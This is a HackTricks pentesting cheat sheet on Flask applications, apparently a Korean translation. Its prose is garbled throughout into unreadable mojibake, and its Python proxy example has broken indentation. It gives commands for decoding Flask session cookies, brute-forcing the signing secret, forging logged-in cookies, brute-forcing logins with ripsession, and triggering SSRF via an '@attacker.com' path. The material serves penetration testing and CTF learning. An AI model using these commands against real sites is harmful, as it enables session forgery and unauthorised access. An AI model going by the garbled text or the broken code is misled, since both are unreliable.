# í”Œë¼ìŠ¤í¬

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œì—ì„œ íˆì–´ë¡œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•**í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

**ì•„ë§ˆë„ CTFë¥¼ ì§„í–‰ ì¤‘ì´ë¼ë©´ Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì€** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ê³¼ ê´€ë ¸ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤.**

## ì¿ í‚¤

ê¸°ë³¸ ì¿ í‚¤ ì„¸ì…˜ ì´ë¦„ì€ **`session`**ì…ë‹ˆë‹¤.

### ë””ì½”ë”

ì˜¨ë¼ì¸ Flask ì¿ í‚¤ ë””ì½”ë”: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### ìˆ˜ë™

ì¿ í‚¤ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì„ ì²« ë²ˆì§¸ ì ê¹Œì§€ ê°€ì ¸ì™€ì„œ Base64ë¡œ ë””ì½”ë”©í•˜ì„¸ìš”.
```bash
echo "ImhlbGxvIg" | base64 -d
```
ì¿ í‚¤ëŠ” ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œëª…ë©ë‹ˆë‹¤

### **Flask-Unsign**

Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„¸ì…˜ ì¿ í‚¤ë¥¼ ì¶”ì¸¡í•˜ì—¬ ë¹„ë°€ í‚¤ë¥¼ ë§ì¶”ì–´ ê°€ì ¸ì˜¤ê³  í•´ë…í•˜ê³  ë¸Œë£¨íŠ¸ í¬ìŠ¤ ë° ì‘ì„±í•˜ëŠ” ëª…ë ¹ ì¤„ ë„êµ¬.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **ì¿ í‚¤ ë””ì½”ë”©**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ë¬´ì°¨ë³„ ëŒ€ì…**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ì„œëª…**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ë ˆê±°ì‹œ(ì´ì „ ë²„ì „) ì‚¬ìš©í•˜ì—¬ ì„œëª…í•˜ê¸°
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

í”Œë¼ìŠ¤í¬-unsignìœ¼ë¡œ ì œì‘ëœ ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi in Flask session cookie with SQLmap

[**ì´ ì˜ˆì œ**](../../pentesting-web/sql-injection/sqlmap/#eval)ëŠ” ì•Œë ¤ì§„ ì‹œí¬ë¦¿ì„ ì‚¬ìš©í•˜ì—¬ Flaskì— ëŒ€í•œ sqlmap í˜ì´ë¡œë“œë¥¼ **ìë™ìœ¼ë¡œ ì„œëª…**í•˜ëŠ” ë° sqlmap `eval` ì˜µì…˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

## Flask Proxy to SSRF

[**ì´ ì„¤ëª…ì„œ**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ì—ì„œ Flaskê°€ "@" ë¬¸ìë¡œ ì‹œì‘í•˜ëŠ” ìš”ì²­ì„ í—ˆìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
ë‹¤ìŒ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
"@attacker.com"ê³¼ ê°™ì€ ê²ƒì„ ì†Œê°œí•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ì—¬ **SSRF**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask)ì„ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥** ê³ ê¸‰ ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•** ë° **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
